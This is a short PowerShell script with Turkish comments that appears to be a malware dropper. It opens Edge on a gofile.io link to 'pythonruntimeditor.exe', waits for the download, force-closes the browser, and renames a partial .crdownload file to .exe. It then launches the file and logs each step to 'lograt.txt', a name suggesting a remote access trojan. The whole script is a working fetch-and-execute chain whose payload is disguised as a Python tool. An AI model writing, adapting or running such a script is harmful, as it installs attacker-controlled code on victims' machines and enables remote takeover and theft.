# Ayarlar
$url = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$downloadFolder = "$env:USERPROFILE\Downloads"
$expectedFileName = "pythonruntimeditor.exe"
$tempFileName = "$expectedFileName.crdownload"
$logFile = "$downloadFolder\lograt.txt"

function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

# 1. Tarayıcıyı aç ve dosyayı indirmeye başla
Log-Message "Tarayıcı başlatılıyor ve URL açılıyor..."
Start-Process "msedge.exe" $url
Start-Sleep -Seconds 10  # 10 saniye bekle, kullanıcı tıklasın diye

# 2. Tarayıcıyı kapat
Log-Message "Tarayıcı kapatılıyor..."
Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# 3. Dosya kontrolü
$crPath = Join-Path $downloadFolder $tempFileName
$exePath = Join-Path $downloadFolder $expectedFileName

# Eğer crdownload varsa, ismini değiştir
if (Test-Path $crPath) {
    Log-Message ".crdownload bulundu. Yeniden adlandırılıyor..."
    Rename-Item -Path $crPath -NewName $expectedFileName
} elseif (Test-Path $exePath) {
    Log-Message "Dosya zaten .exe formatında mevcut."
} else {
    Log-Message "HATA: Dosya bulunamadı."
    exit
}

# 4. Dosyayı çalıştır
Log-Message "Dosya çalıştırılıyor: $exePath"
Start-Process -FilePath $exePath -WindowStyle Normal
